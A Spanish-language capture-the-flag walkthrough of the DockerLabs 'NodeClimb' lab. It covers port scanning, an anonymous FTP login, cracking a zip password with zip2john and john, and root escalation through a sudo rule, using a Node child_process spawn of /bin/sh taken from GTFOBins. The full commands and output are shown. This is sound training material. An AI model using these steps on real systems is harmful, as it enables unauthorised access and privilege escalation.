---
title: DockerLabs - NodeClimb
author: elcybercurioso
date: 2025-10-26 13:00
categories: [Post, DockerLabs]
tags: [fácil, ftp, ssh, john, zip2john]
media_subpath: "/assets/img/posts/dockerlabs_nodeclimb"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Nodeclimb]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-26 12:31 GMT
Initiating ARP Ping Scan at 12:31
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 12:31, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:31
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 21/tcp on 172.17.0.2
Completed SYN Stealth Scan at 12:31, 10.22s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up (0.000030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.51 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Nodeclimb]
└─$ nmap -sCV -p21,22 172.17.0.2                                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-26 12:32 GMT
Nmap scan report for 172.17.0.2
Host is up (0.000072s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             242 Jul 05  2024 secretitopicaron.zip
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 cd:1f:3b:2d:c4:0b:99:03:e6:a3:5c:26:f5:4b:47:ae (ECDSA)
|_  256 a0:d4:92:f6:9b:db:12:2b:77:b6:b1:58:e0:70:56:f0 (ED25519)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.31 seconds
```

## explotación

Del escaneo de puertos encontramos que podemos conectarnos de manera anónima al servidor FTP con el usuario `anonymous`, y sin indicar contraseña:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Nodeclimb]
└─$ ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.3)
Name (172.17.0.2:elcybercurioso): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
Remote directory: /
```

Dentro del servidor FTP, hay un comprimido .zip que podemos descargarnos para echarle un vistazo:

```bash
ftp> get secretitopicaron.zip
local: secretitopicaron.zip remote: secretitopicaron.zip
229 Entering Extended Passive Mode (|||10628|)
150 Opening BINARY mode data connection for secretitopicaron.zip (242 bytes).
100% |******************************************************************************************************************************************************|   242        1.22 MiB/s    00:00 ETA
226 Transfer complete.
242 bytes received in 00:00 (169.16 KiB/s)
```

Tratamos de abrirlo para descomprimir su contenido, pero vemos que nos pida una contraseña para poder hacerlo:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Nodeclimb]
└─$ 7z x secretitopicaron.zip 

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_GB.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 242 bytes (1 KiB)

Extracting archive: secretitopicaron.zip
--
Path = secretitopicaron.zip
Type = zip
Physical Size = 242

    
Enter password (will not be echoed):
ERROR: Wrong password : password.txt
                   
Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1
```

Podemos obtener el hash del comprimido .zip para sacar la contraseña por fuerza bruta. Para ello emplearemos la herramienta `zip2john`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Nodeclimb]
└─$ zip2john secretitopicaron.zip > hash
ver 1.0 efh 5455 efh 7875 secretitopicaron.zip/password.txt PKZIP Encr: 2b chk, TS_chk, cmplen=52, decmplen=40, crc=59D5D024 ts=4C03 cs=4c03 type=0
```

Teniendo el hash, sacamos la contraseña con `john`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Nodeclimb]
└─$ john -w=/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100000.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
p********        (secretitopicaron.zip/password.txt)     
1g 0:00:00:00 DONE (2025-10-26 12:40) 20.00g/s 327680p/s 327680c/s 327680C/s 123456..xaxaxa
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Volvemos a abrir el comprimido, pero ahora indicamos la contraseña obtenida:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Nodeclimb]
└─$ 7z x secretitopicaron.zip                                                                    

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_GB.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 242 bytes (1 KiB)

Extracting archive: secretitopicaron.zip
--
Path = secretitopicaron.zip
Type = zip
Physical Size = 242

    
Would you like to replace the existing file:
  Path:     ./password.txt
  Size:     0 bytes
  Modified: 2024-07-05 09:32:05
with the file from archive:
  Path:     password.txt
  Size:     40 bytes (1 KiB)
  Modified: 2024-07-05 09:32:05
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? Y

                   
Enter password (will not be echoed):
Everything is Ok

Size:       40
Compressed: 242
```

En el directorio vemos que nos ha generado un fichero llamado `password.txt`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Nodeclimb]
└─$ ls
hash  password.txt  secretitopicaron.zip
```

Dentro hay unas credenciales, las cuales resultan ser para acceder por SSH a la máquina:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Nodeclimb]
└─$ cat password.txt                                           
mario:laKon***************************
```

## escalada de privilegios

Tras acceder, vemos que los permisos SUDO del usuario permiten ejecutar con `node` el script que se encuentra en la ubicación `/home/mario/script.js`:

```bash
mario@c7c3692488dd:~$ sudo -l
Matching Defaults entries for mario on c7c3692488dd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on c7c3692488dd:
    (ALL) NOPASSWD: /usr/bin/node /home/mario/script.js
```

Comprobamos que tenemos permisos para modificarlo, ya que el propietario de dicho fichero es el usuario con el que estamos logueados:

```bash
mario@c7c3692488dd:~$ ls -l 
total 0
-rw-r--r-- 1 mario mario 0 Jul  5  2024 script.js
```

En [GTFOBins](https://gtfobins.github.io/gtfobins/node/#sudo) encontramos que podemos obtener una consola invocando un cierto comando:

![Desktop View](/20251026134556.webp){: width="972" height="589" .shadow}

Modificamos el fichero con la instrucción que nos indicaban:

```bash
mario@c7c3692488dd:~$ cat script.js 
require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})
```

Al ejecutar el comando con permisos SUDO, vemos que hemos podido invocar una consola como el usuario `root`:

```bash
mario@c7c3692488dd:~$ sudo /usr/bin/node /home/mario/script.js
# whoami
root
```

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>